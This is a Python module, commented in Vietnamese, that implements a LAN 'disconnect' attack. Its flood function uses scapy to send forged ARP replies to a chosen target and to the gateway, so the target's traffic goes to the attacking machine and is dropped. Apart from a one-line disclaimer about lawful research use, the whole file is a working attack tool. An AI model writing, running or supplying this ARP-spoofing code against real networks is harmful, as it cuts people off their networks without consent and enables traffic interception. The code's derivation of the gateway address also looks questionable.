"""Module cung cấp hàm flood để thực hiện tấn công Disconnect.

Lưu ý: Việc tấn công Disconnect có thể vi phạm pháp luật. Chỉ sử dụng cho mục đích nghiên cứu và kiểm thử trong môi trường hợp pháp.
"""

import logging
from time import sleep

from colorama import Fore as F
from getmac import get_mac_address as get_host_mac
from scapy.all import send
from scapy.layers.l2 import ARP

from tools.addons.ip_tools import __get_local_host_ips, __get_mac

# Cấu hình logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Thiết lập địa chỉ IP và MAC cho gateway và host
try:
    local_ips = __get_local_host_ips()
    if not local_ips:
        raise ValueError("Không thể lấy địa chỉ IP cục bộ.")
    GATEWAY_IP = local_ips[0]
    GATEWAY_MAC = __get_mac(GATEWAY_IP)
    HOST_MAC = get_host_mac()
except Exception as e:
    logging.error("Lỗi khi thiết lập thông tin mạng: %s", e)
    raise

def flood(target: str, sleep_interval: float = 0.5) -> None:
    """Gửi liên tục các gói ARP giả mạo nhằm ngắt kết nối target khỏi mạng LAN.

    Cách thức hoạt động tương tự như hàm ARP flood, tuy nhiên các gói được gửi không được
    chuyển tiếp đến gateway. Như vậy, tất cả các gói từ target sẽ bị chuyển về máy tấn công và
    bị bỏ qua trước khi đến gateway, khiến target mất kết nối với mạng.

    Args:
        target (str): Địa chỉ IP của mục tiêu bị ngắt kết nối.
        sleep_interval (float, optional): Khoảng thời gian chờ giữa các lần gửi gói. Mặc định là 0.5 giây.

    Returns:
        None
    """
    try:
        # Gói ARP cho target: target tin rằng gateway có MAC là của máy tấn công.
        packet_target = ARP(
            op=2,
            pdst=target,
            hwdst=__get_mac(target),
            psrc=GATEWAY_IP
        )
        send(packet_target, verbose=False)

        # Gói ARP cho gateway: gateway tin rằng target có MAC là của máy tấn công.
        packet_gateway = ARP(
            op=2,
            pdst=GATEWAY_IP,
            hwdst=GATEWAY_MAC,
            psrc=target
        )
        send(packet_gateway, verbose=False)

        logging.info("%s is now disconnected", target)
    except Exception as e:
        logging.error("Lỗi khi gửi gói ARP: %s", e)

    sleep(sleep_interval)